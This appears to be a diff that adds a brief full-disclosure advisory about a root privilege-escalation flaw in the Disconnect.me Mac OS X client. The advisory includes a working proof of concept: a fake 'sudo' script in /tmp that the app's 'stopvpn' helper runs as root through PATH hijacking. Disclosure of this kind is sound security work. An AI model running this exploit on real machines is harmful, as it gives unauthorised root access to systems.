@@ -1,0 +1,30 @@
+Disconnect.me is the search engine entrusted by the Tor Browser.
+ 
+Unfortunately, the Mac OS X client has an LPE to root vulnerability (0day).
+ 
+Original Download <= v2.0: https://disconnect.me/premium/mac
+ 
+Archived Download: http://d-h.st/LKqG
+ 
+Disconnect+Desktop.pkg: sha256 = bc94c94c88eb5c138396519ff994ae8efe85899475f44e54f71a6ebc047ce4e7
+ 
+https://www.virustotal.com/en/file/bc94c94c88eb5c138396519ff994ae8efe85899475f44e54f71a6ebc047ce4e7/analysis/
+ 
+PoC:
+"""
+$ id
+uid=501(...) gid=20(staff) ...
+$ cat /tmp/sudo
+#!/bin/bash
+/usr/bin/id
+/bin/bash
+$ chmod +x /tmp/sudo
+$ PATH=/tmp "/Library/Application Support/disconnect/stopvpn"
+uid=0(root) gid=0(wheel) ...
+# /usr/bin/whoami
+root
+"""
+ 
+--
+Kristian Erik Hermansen (@h3rm4ns3c)
+https://www.linkedin.com/in/kristianhermansen
